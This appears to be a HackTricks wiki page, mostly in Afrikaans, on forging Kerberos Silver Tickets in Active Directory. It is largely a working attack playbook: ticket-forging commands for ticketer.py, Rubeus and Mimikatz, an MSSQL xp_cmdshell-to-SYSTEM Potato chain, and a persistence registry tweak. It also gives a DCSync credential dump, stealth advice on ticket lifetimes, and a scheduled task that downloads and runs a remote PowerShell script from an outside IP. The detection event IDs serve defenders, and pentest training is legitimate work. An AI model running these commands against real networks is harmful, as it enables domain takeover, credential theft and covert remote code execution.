# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Die **Silver Ticket**-aanval behels die uitbuiting van service-tickets in Active Directory (AD) omgewings. Hierdie metode berus op die **verkryging van die NTLM-hash van 'n service account**, soos 'n rekenaarrekening, om 'n Ticket Granting Service (TGS) ticket te vervals. Met hierdie vervalste ticket kan 'n aanvaller toegang tot spesifieke dienste op die netwerk kry, **enige gebruiker voorgee**, gewoonlik met die doel om administratiewe voorregte te verkry. Dit word beklemtoon dat die gebruik van AES-sleutels om tickets te vervals veiliger en minder opspoorbaar is.

> [!WARNING]
> Silver Tickets is minder opspoorbaar as Golden Tickets omdat hulle slegs die **hash van die service account** benodig, nie die krbtgt-rekening nie. Hulle is egter beperk tot die spesifieke diens wat hulle teiken. Verder is dit soms genoeg om net 'n gebruiker se wagwoord te steel.
> Verder, as jy 'n **rekening se wagwoord met 'n SPN** kompromitteer, kan jy daardie wagwoord gebruik om 'n Silver Ticket te skep wat enige gebruiker na daardie diens impersonate.

### Modern Kerberos changes (AES-only domains)

- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES session keys** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Always extract **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) for the target service account.
- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` minutes) to avoid detection by abnormal lifetimes.

For ticket crafting, different tools are employed based on the operating system:

### On Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Op Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer se lêerstelsel te verkry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir take en WMI-navrae.

### Voorbeeld: MSSQL service (MSSQLSvc) + Potato to SYSTEM

As jy die NTLM hash (of AES key) van 'n SQL service-rekening (bv. sqlsvc) het, kan jy 'n TGS vir die MSSQL SPN forgeer en enige gebruiker teen die SQL-diens naboots. Vanaf daar, skakel xp_cmdshell in om opdragte as die SQL service-rekening uit te voer. As daardie token SeImpersonatePrivilege het, ketting 'n Potato om op te gradeer na SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- As die resulterende konteks SeImpersonatePrivilege het (dikwels waar vir diensrekeninge), gebruik 'n Potato-variant om SYSTEM te kry:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Meer besonderhede oor die misbruik van MSSQL en die aktivering van xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Oorsig van Potato techniques:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Beskikbare Dienste

| Dienssoort                                  | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Deur gebruik te maak van **Rubeus** kan jy al hierdie tickets versoek met die parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Gebeurtenis-ID's

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- Geen voorafgaande 4768/4769 op die DC vir dieselfde kliënt/diens is 'n algemene aanduiding dat 'n vervalste TGS direk aan die diens aangebied word.
- Abnormaal lang ticket-levensduur of onverwagte enkripsietipe (RC4 wanneer die domein AES afdwing) lei ook op by 4769/4624 data.

## Persistensie

Om te voorkom dat masjiene hul wagwoord elke 30 dae roteer, stel `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` of jy kan `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` op 'n groter waarde as 30 dae stel om die rotasieperiode aan te dui wanneer die masjien se wagwoord geroteer moet word.

## Misbruik van Service tickets

In die volgende voorbeelde, laat ons voorstel dat die ticket verkry is deur die administrateur rekening te impersonate.

### CIFS

Met hierdie ticket sal jy toegang hê tot die `C$` en `ADMIN$` gids via **SMB** (as dit blootgestel is) en kan jy lêers na 'n deel van die afgeleë lêerstelsel kopieer deur iets soos die volgende te doen:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Jy sal ook in staat wees om 'n shell binne die host te verkry of arbitrêre opdragte uit te voer met behulp van **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Met hierdie toestemming kan jy geskeduleerde take op afstandrekenaars genereer en arbitrêre opdragte uitvoer:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Met hierdie tickets kan jy **execute WMI in the victim system**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Vind **meer inligting oor wmiexec** op die volgende bladsy:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### GASHEER + WSMAN (WINRM)

Met winrm-toegang tot 'n rekenaar kan jy dit **benader** en selfs 'n PowerShell kry:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Kyk na die volgende bladsy om **meer maniere te leer om met 'n afgeleë gasheer via winrm te verbind**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Let wel dat **winrm moet aktief wees en luister** op die afgeleë rekenaar om toegang daartoe te kry.

### LDAP

Met hierdie voorreg kan jy die DC-databasis dump met **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Lees meer oor DCSync** op die volgende bladsy:


{{#ref}}
dcsync.md
{{#endref}}


## Verwysings

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
